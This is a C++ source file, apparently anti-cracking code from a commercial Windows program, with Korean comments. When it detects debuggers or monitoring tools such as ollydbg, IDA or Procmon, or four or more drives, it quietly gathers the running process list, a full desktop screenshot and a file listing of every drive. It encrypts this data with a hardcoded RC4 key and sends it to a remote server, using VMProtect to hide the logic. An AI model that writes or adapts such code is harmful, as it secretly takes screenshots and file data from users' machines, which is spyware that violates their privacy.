/////////////  CrackInfo.cpp   ///////////////
#include "stdafx.h"
#include "CrackInfo.h"
#include <io.h>
#include <Tlhelp32.h>
#include <atlimage.h>

#define CRACKINFO_PORT				14323

// 버퍼의 길이를 귀환.
int GetProcessNameList(char** szProcessNameList)
{
	VMProtectBegin("cr1");
	*szProcessNameList = NULL;
	int nRet = 0;
	DWORD ProcessID = 0;

	HANDLE         hProcessSnap = NULL; 
	BOOL           bRet      = FALSE; 
	PROCESSENTRY32 pe32      = {0}; 	

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
	if (hProcessSnap == INVALID_HANDLE_VALUE) 
		return 0; 	

	int nLen = 0;
	TCHAR szEnter[] = _T("\n");

	pe32.dwSize = sizeof(PROCESSENTRY32);  
	if (Process32First(hProcessSnap,&pe32)) 
	{ 
		do
		{             
			if (_tcsicmp(pe32.szExeFile, _T(".")) == 0) continue;
			if (_tcsicmp(pe32.szExeFile, _T("..")) == 0) continue;

			nLen += _tcslen(pe32.szExeFile);
			nLen += sizeof(szEnter);
		} while(Process32Next(hProcessSnap,&pe32)); 
	} 

	TCHAR* tszNameList = new TCHAR[nLen + 40];
	if (tszNameList)
	{
		memset(tszNameList, 0, sizeof(TCHAR) * (nLen + 40));
		if (Process32First(hProcessSnap,&pe32)) 
		{ 
			do
			{             
				if (_tcsicmp(pe32.szExeFile, _T(".")) == 0) continue;
				if (_tcsicmp(pe32.szExeFile, _T("..")) == 0) continue;

				_tcscat_s(tszNameList, nLen+40, pe32.szExeFile);
				_tcscat_s(tszNameList, nLen+40, szEnter);
			} while(Process32Next(hProcessSnap,&pe32)); 

			if (sizeof(TCHAR) == 1)
			{
				nRet = _tcslen(tszNameList);
				*szProcessNameList = (char*)tszNameList;
				//OutputDebugStringA(tszNameList);
			}
			else 
			{
				nRet = WideCharToMultiByte(CP_OEMCP, 0, (WCHAR*)tszNameList, -1, NULL, 0, NULL, NULL);
				if (nRet > 0)
				{
					char* szNameList = new char [nRet];
					memset(szNameList, 0, nRet);
					WideCharToMultiByte(CP_OEMCP, 0, (WCHAR*)tszNameList, -1, szNameList, nRet, NULL, NULL);
					*szProcessNameList = szNameList;
					//OutputDebugStringA(szNameList);
				}
			}
		}
	}
	else 
	{
		nRet = 0;
	}
	
	CloseHandle(hProcessSnap);
	VMProtectEnd();
	return nRet; 
}

// 이미지버퍼의 길이를 귀환한다.
int GetScreenCaptureBuffer(char** pImageBuffer)
{
	VMProtectBegin("cr2");
	CWnd *pWnd = CWnd::FromHandle(GetDesktopWindow());
	CRect rect;
	pWnd->GetWindowRect(rect);

	CWindowDC dcWnd(pWnd);

	CImage Image;
	Image.Create(rect.Width(), rect.Height(), dcWnd.GetDeviceCaps(BITSPIXEL));

	CDC *pDC = CDC::FromHandle(Image.GetDC());
	pDC->StretchBlt(0,0, rect.Width(), rect.Height(), &dcWnd, 0, 0,rect.Width(),rect.Height(), SRCCOPY);
	Image.ReleaseDC();

	TCHAR filename[MAX_PATH]={0};
	TCHAR tmpdir[MAX_PATH]={0};

	GetTempPath( MAX_PATH, tmpdir );
	_stprintf_s(filename, MAX_PATH, _T("%s\\%d.tmp"), tmpdir, GetTickCount());
	Image.Save(filename, Gdiplus::ImageFormatGIF);

	int fileLen = 0;
	char *buf=NULL;
	FILE* fp=NULL;
	_tfopen_s(&fp,filename,_T("rb"));
	if (fp)
	{
		fileLen=_filelength(_fileno(fp));
		if (fileLen)
		{
			buf=new char[fileLen];
			fread(buf,fileLen,1,fp);
			fclose(fp);
			DeleteFile(filename);
			*pImageBuffer = buf;
			return fileLen;
		}
	}
	VMProtectEnd();
	return 0;
}


// 하드디스크 파일목록정보 얻기
CString treeLists;
void TreeRecursive(LPCTSTR FolderPath,int Depth)
{
	TCHAR d[10];
	TCHAR e[30];
	wsprintf(d,_T("\r\n"));
	TCHAR path[256];
	wsprintf(path,_T("%s\\*.*"),FolderPath);
	CFileFind cfile;
	BOOL bFileExist = false;
	bFileExist = cfile.FindFile(path);
	while(bFileExist)
	{
		bFileExist = cfile.FindNextFile();
		if(cfile.IsDots())continue;
		treeLists+=d;
		treeLists+=cfile.GetFilePath();

		if((cfile.IsDirectory())&&Depth>1)
		{
			TreeRecursive(cfile.GetFilePath(),Depth-1);
		}
		if(!(cfile.IsDirectory()))
		{
			CTime refTime;
			cfile.GetLastWriteTime(refTime);
			CString dd=refTime.Format(_T("%Y-%m-%d"));
			_stprintf(e, _T("  %dKB  "),(cfile.GetLength()+1023)/1024);
			treeLists+=e;
			treeLists+=dd;
		}
	}
}


int TreeList(char**pszFileList, LPCTSTR FolderPath,int Depth)
{
	treeLists=_T("");
	TCHAR d[10];
	DWORD drivers=GetLogicalDrives();
	if(((PBYTE)FolderPath)[0]==0)
	{
		int i=0;
		while(drivers)
		{
			if(drivers&1)
			{
				treeLists+=_T("\r\n");
				wsprintf(d,_T("%c:"),'A'+i);
				treeLists+=d;
				if(Depth>1)
					TreeRecursive(d,Depth-1);
			}
			drivers>>=1;
			i++;
		}
	}
	else
	{
		TreeRecursive(FolderPath,Depth);
	}

	char* pBuf;
	int nLen  = treeLists.GetLength();
#ifdef UNICODE
	nLen = WideCharToMultiByte(CP_OEMCP, 0, (WCHAR*)treeLists.GetBuffer(), -1, NULL, 0, NULL, NULL);
	if (nLen > 0)
	{
		pBuf = new char [nLen + 1];
		memset(pBuf, 0, nLen + 1);
		WideCharToMultiByte(CP_OEMCP, 0, (WCHAR*)treeLists.GetBuffer(), -1, pBuf, nLen, NULL, NULL);
		*pszFileList = pBuf;
	}

#else
	pBuf = new char [nLen + 1];
	memset(pBuf, 0, nLen + 1);
	sprintf_s(pBuf, nLen + 1, "%s", treeLists);
	*pszFileList = pBuf;
#endif

	//OutputDebugStringA(pBuf);

	return nLen;
}

//////////////////////////////////////////////////////////////////////////


// 2012.07.20 rchb
#define RC4_KEYLEN1	20
#define swap_byte1(x,y) t = *(x); *(x) = *(y); *(y) = t

typedef struct rc4_key1
{     
	unsigned char x;        
	unsigned char y;
	unsigned char state[256];       
} rc4_key1;


void prepare_key1(unsigned char *key_data_ptr, int key_data_len, rc4_key1 *key)
{
	VMProtectBegin("cr5");
	unsigned char t;
	unsigned char index1;
	unsigned char index2;
	unsigned char* state;
	short counter;

	state = &key->state[0];
	for(counter = 0; counter < 256; counter++)
		state[counter] = (BYTE)counter;
	key->x = 0;
	key->y = 0;
	index1 = 0;
	index2 = 0;
	for(counter = 0; counter < 256; counter++)
	{
		index2 = (key_data_ptr[index1] + state[counter] + index2) % 256;
		swap_byte1(&state[counter], &state[index2]);
		index1 = (index1 + 1) % key_data_len;
	}
	VMProtectEnd();
}

void rc41(unsigned char *buffer_ptr, int buffer_len, rc4_key1 *key)
{
	unsigned char t;
	unsigned char x;
	unsigned char y;
	unsigned char* state;
	unsigned char xorIndex;
	int counter;

	x = key->x;
	y = key->y;
	state = &key->state[0];
	for(counter = 0; counter < buffer_len; counter++)
	{
		x = (x + 1) % 256;
		y = (state[x] + y) % 256;
		swap_byte1(&state[x], &state[y]);
		xorIndex = (state[x] + state[y]) % 256;
		buffer_ptr[counter] ^= state[xorIndex];
	}
	key->x = x;
	key->y = y;
}

void rc41Convert(LPBYTE pbybuf, int nbuflen)
{
	VMProtectBegin("cr4");
	rc4_key1 key;
	BYTE	initKey[RC4_KEYLEN1] = {
		0xCD, 0x38, 0xE6, 0x0C, 0x3D, 0x21, 0x5F, 0x1A, 0x20, 0xAA, 
		0x11, 0x73, 0x6C, 0xFF, 0x7A, 0xC6, 0x37, 0x66, 0x1F, 0xD9, 
	};

	prepare_key1(initKey, RC4_KEYLEN1, &key);
	rc41(pbybuf, nbuflen, &key);
	VMProtectEnd();

}
//

// 2012.07.20 rchb
BOOL SendCrackInfo()
{
	SOCKET sock;
	SOCKADDR_IN	saddr;
	int	nSendTimeOut = 30*1000;
	int	nRecvTimeOut = 60*1000;
	BOOL bRet = FALSE;
	int nLen1 = 0, nLen2 = 0;
	char* pSendBuf = NULL;
	char* pSendBuffer = NULL;
	int nSendLen = 0;

	VMProtectBegin("cr3");

	TCHAR szComName[MAX_PATH] = {0};
	DWORD dwComNameLen = MAX_PATH;
	GetComputerName(szComName, &dwComNameLen);
	if(_tcsicmp(szComName, VMProtectDecryptStringW(L"chtest001")) != 0 && _tcsicmp(szComName, VMProtectDecryptStringW(L"chtest002")) != 0)
	{
		for (int nType = 0; nType < 3; nType ++)
		{
			//소켓창조 접속
			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if(sock == INVALID_SOCKET)
			{
				Sleep(1000);
				continue;
			}

			//아이피로드


			saddr.sin_family = AF_INET;
			saddr.sin_addr.s_addr = inet_addr(SERVER_IP);
			saddr.sin_port = htons(CRACKINFO_PORT);

			//서버에 접속
			if(connect(sock, (SOCKADDR*)&saddr, sizeof(saddr)))
			{
				closesocket(sock);
				sock = INVALID_SOCKET;
				Sleep(1000);
				continue;
			}

			//setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO,(char *)&nRecvTimeOut,4);
			//setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO,(char *)&nSendTimeOut,4);


			pSendBuf = NULL;
			if (nType == 0) nLen1 = GetProcessNameList(&pSendBuf);
			else if (nType == 1) nLen1 = GetScreenCaptureBuffer(&pSendBuf);
			else if (nType == 2) nLen1 = TreeList(&pSendBuf, _T(""), 2);

			pSendBuffer = NULL;
			if (nLen1 > 0)
			{
				nSendLen = 4 + 4 + nLen1;
				pSendBuffer = new char [nSendLen];
				if (pSendBuffer)
				{
					*(DWORD*)pSendBuffer = nType;
					*(DWORD*)(pSendBuffer + 4) = nLen1;
					memcpy(pSendBuffer+8, pSendBuf, nLen1);

					rc41Convert((BYTE*)pSendBuffer + 8, nLen1);
				}
				else
				{
					nSendLen = 0;
				}
			}


			if (nSendLen > 0)
			{
				int nLen=0, nnLen = 0;
				while(nLen<nSendLen)
				{
					nnLen=send(sock, pSendBuffer+nLen, nSendLen, 0);
					if(nnLen<=0)
					{
						break;
					}
					nLen+=nnLen;
				}

				if (nSendLen == nLen) bRet = TRUE;
				if (pSendBuffer) delete pSendBuffer;
			}

			if (pSendBuf) delete pSendBuf;


			closesocket(sock);
			sock = INVALID_SOCKET;
			Sleep(1000);
		}
	}
	
	VMProtectEnd();
	
	return bRet;
}
//

DWORD WINAPI CheckCrackProcessNameAndDiskDriverCountThread(LPVOID)
{
	BOOL bCrackProcessName = FALSE;
	PROCESSENTRY32 ProcessEntry32;

	VMProtectBegin("cr6");
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot != INVALID_HANDLE_VALUE)
	{
		ProcessEntry32.dwSize = sizeof(ProcessEntry32);
		if (Process32First(hSnapShot, &ProcessEntry32))
		{
			do 
			{
				if((_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"devenv.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"idag.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"msnmsgr.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"skype.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"cprocess.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"ollydbg.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"Regmon.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"Filemon.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"Dbgview.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"Procmon.exe")) == 0) ||
					(_tcsicmp(ProcessEntry32.szExeFile, VMProtectDecryptStringW(L"Tcpview.exe")) == 0)
					)
				{
					bCrackProcessName = TRUE;
					break;
				}
			} while (Process32Next(hSnapShot, &ProcessEntry32));
		}
		CloseHandle(hSnapShot);
	}

	DWORD drivers=GetLogicalDrives();
	int nDiskDriverCount = 0;
	while(drivers)
	{
		if(drivers&1)
		{
			nDiskDriverCount ++;
		}
		drivers>>=1;
	}
	if(bCrackProcessName || nDiskDriverCount >= 4)
	{
		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		SendCrackInfo();
		return 1;
	}
	
	VMProtectEnd();
	return 0;
}
void CheckCrackProcessNameAndDiskDriverCount()
{
	CreateThread(NULL, NULL, CheckCrackProcessNameAndDiskDriverCountThread, NULL, NULL, NULL);
	return;
}